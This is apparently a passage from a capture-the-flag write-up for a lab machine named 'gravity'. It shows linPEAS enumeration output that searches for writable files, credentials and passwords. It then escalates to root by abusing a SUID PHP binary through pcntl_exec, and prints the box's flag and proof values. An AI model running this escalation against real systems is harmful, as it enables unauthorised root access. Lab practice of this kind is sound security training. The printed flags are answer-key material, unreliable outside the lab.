-rw-r--r-- 1 root root 3935 Mar 29 07:02 /var/backups/apt.extended_states.2.gz
-rwxrwxr-- 1 www-data www-data 84 Mar 17  2021 /var/www/html/grav-admin/backup/.gitkeep

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                           
/dev/mqueue                                                                                                                                                 
/dev/shm
/run/lock
/run/lock/apache2
/run/screen
/snap/core20/1611/run/lock
/snap/core20/1611/tmp
/snap/core20/1611/var/tmp
/snap/core20/1852/run/lock
/snap/core20/1852/tmp
/snap/core20/1852/var/tmp
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/linpeas.sh
/tmp/reverse.sh
/tmp/.Test-unix
#)You_can_write_even_more_files_inside_last_directory

/var/cache/apache2/mod_cache_disk
/var/crash
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                           
  Group www-data:                                                                                                                                           
/tmp/linpeas.sh                                                                                                                                             
/tmp/reverse.sh

╔══════════╣ Searching passwords in config PHP files
        'storage_sql_password' => isset($_ENV['CLOCKWORK_STORAGE_SQL_PASSWORD']) ? $_ENV['CLOCKWORK_STORAGE_SQL_PASSWORD'] : null,                          

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                  
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
2023-04-03 08:48:49,707 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran                     
2023-04-03 08:48:49,707 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2023-04-05 23:01:37,141 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2023-04-05 23:01:37,141 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
[    3.340061] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
[    3.472913] systemd[1]: Started Forward Password Requests to Wall Directory Watch.



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                          
                                ╚════════════════╝                                                                                                          
Regexes to search for API keys aren't activated, use param '-r' 


www-data@gravity:/tmp$ ls /home
```

```
CMD="/bin/sh"
./php -r "pcntl_exec('/bin/sh', ['-p']);""
```

```www-data@gravity:/tmp$ /usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
# whoami
whoami
root
# cd /root 
cd /root
# ls
ls
flag1.txt  proof.txt  snap
# cat flag1.txt
cat flag1.txt
T2Zmc2Vj
# cat proof.txt
cat proof.txt
2a7dccf7efbaedf7ec6fcbd9b77b281c
# cd /home/alex
cd /home/alex
# ls
ls
# exit
exit
```

SUID WAS THE ANSWER! Used GTFO BINS HERE